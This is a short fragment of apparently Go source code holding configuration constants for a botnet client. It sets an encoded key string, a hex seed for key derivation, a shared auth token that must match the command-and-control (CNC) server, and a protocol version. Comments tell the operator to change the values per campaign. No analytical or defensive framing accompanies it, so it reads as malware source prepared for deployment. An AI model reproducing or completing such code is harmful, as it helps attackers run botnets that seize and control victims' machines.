...
const gothTits = "KgoSZvsQREBxlLkJRHPW5nSTisDZOIEj5erPyQI=" //change me run setup.py

// cryptSeed is the 8-char hex seed used for key derivation.
const cryptSeed = "72219864" //change me run setup.py

// magicCode is the shared auth token — must match CNC.
const magicCode = "Kpog2p@7BkitGXbb" //change this per campaign

// protocolVersion must match the CNC's protocol version string.
const protocolVersion = "v3.4.92" //change this per campaign
